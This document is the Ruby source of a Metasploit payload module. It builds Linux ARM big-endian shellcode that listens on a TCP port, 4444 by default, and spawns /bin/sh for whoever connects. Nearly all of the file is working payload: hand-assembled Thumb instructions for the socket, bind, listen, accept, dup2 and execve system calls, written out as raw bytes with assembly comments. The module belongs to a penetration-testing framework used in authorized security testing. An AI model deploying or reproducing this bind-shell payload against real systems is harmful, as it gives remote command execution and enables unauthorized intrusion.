##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 118

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux ARM Big Endian Command Shell, Bind TCP Inline',
      'Description'   => 'Listen for a connection and spawn a command shell',
      'Author'        => 'Balazs Bucsay @xoreipeip <balazs.bucsay[-at-]rycon[-dot-]hu>',
      'References'    => ['URL', 'https://github.com/earthquake/shellcodes/blob/master/armeb_linux_ipv4_bind_tcp.s'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_ARMBE,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShellUnix
      ))
    # Register command execution options
    register_options(
      [
        OptString.new('CMD', [ true, "The command to execute.", "/bin/sh" ]),
        Opt::LPORT(4444)
      ])
  end
  def generate
    cmd = (datastore['CMD'] || '') + "\x00"
    bytehigh = (datastore['LPORT'].to_i >> 8).chr
    bytelow = (datastore['LPORT'].to_i & 0xFF).chr

    payload =
            # turning on thumb mode
            "\xe2\x8f\x60\x01"	+ #	add 	r6, pc, #1	#
            "\xe1\x2f\xff\x16"	+ #	bx	r6		#

            # thumb mode on
            # socket(2,1,0)
            "\x1a\x92"		+ #	sub	r2, r2, r2	#
            "\x1c\x51"		+ #	add	r1, r2, #1	#
            "\x1c\x90"		+ #	add	r0, r2, #2	#
            "\x02\x0f"		+ #	lsl	r7, r1, #8	#
            "\x37\x19"		+ #	add	r7, r7, #0x19	#
            "\xdf\x01"		+ #	svc	1		#
            "\x1c\x06"		+ #	mov	r6, r0		#

            # bind()
            "\x22\x02"		+ #	mov	r2, #2		#
            "\x02\x12"		+ #	lsl	r2, r2, #8	#
            "\x32"+bytehigh	+ #	add	r2, r2, #0xXX	#
            "\x02\x12"		+ #	lsl	r2, r2, #8	#
            "\x32"+bytelow	+ #	add	r2, r2, #0xXX	#
            "\x1a\xdb"		+ #	sub	r3, r3, r3	#
            "\x1b\x24"		+ #	sub	r4, r4, r4	#
            "\x1b\x6d"		+ #	sub 	r5, r5, r5	#
            "\x46\x69"		+ #	mov	r1, sp		#
            "\xc1\x3c"		+ #	stm	r1!, {r2-r5}	#
            "\x39\x10"		+ #	sub	r1, #0x10	#
            "\x22\x10"		+ #	mov	r2, #16		#
            "\x37\x01"		+ #	add	r7, r7, #1	#
            "\xdf\x01"		+ #	svc	1		#

            # listen()
            "\x1c\x30"		+ #	mov	r0, r6		#
            "\x1a\x49"		+ #	sub	r1, r1, r1	#
            "\x37\x02"		+ #	add	r7, r7, #2	#
            "\xdf\x01"		+ #	svc	1		#

            # accept()
            "\x1c\x30"		+ #	mov	r0, r6		#
            "\x1a\x92"		+ #	sub	r2, r2, r2	#
            "\x37\x01"		+ #	add	r7, r7, #1	#
            "\xdf\x01"		+ #	svc	1		#
            "\x1c\x06"		+ #	mov	r6, r0		#

            # dup2()
            "\x1a\x49"		+ #	sub	r1, r1, r1	#
            "\x27\x3f"		+ #	mov	r7, #63	#
            "\xdf\x01"		+ #	svc     1		#
            "\x1c\x30"		+ #	mov	r0, r6	#
            "\x31\x01"		+ #	add	r1, r1, #1	#
            "\xdf\x01"		+ #	svc     1		#
            "\x1c\x30"		+ #	mov	r0, r6	#
            "\x31\x01"		+ #	add	r1, r1, #1	#
            "\xdf\x01"		+ #	svc     1		#

            # execve()
            "\x1a\x92"		+ #	sub	r2, r2, r2	#
            "\x46\x78"		+ #	mov 	r0, pc		#
            "\x30\x12"		+ #	add 	r0, #18		#
            "\x92\x02"		+ #	str	r2, [sp, #8]	#
            "\x90\x01"		+ #	str	r0, [sp, #4]	#
            "\xa9\x01"		+ #	add 	r1, sp, #4	#
            "\x27\x0b"		+ #	mov 	r7, #11		#
            "\xdf\x01"		+ #	svc 	1		#

            # exit()
            "\x1b\x24"		+ #	sub	r4, r4, r4	#
            "\x1c\x20"		+ #	mov	r0, r4		#
            "\x27\x01"		+ #	mov 	r7, #1		#
            "\xdf\x01"		+ #	svc 	1		#
            cmd
  end
end
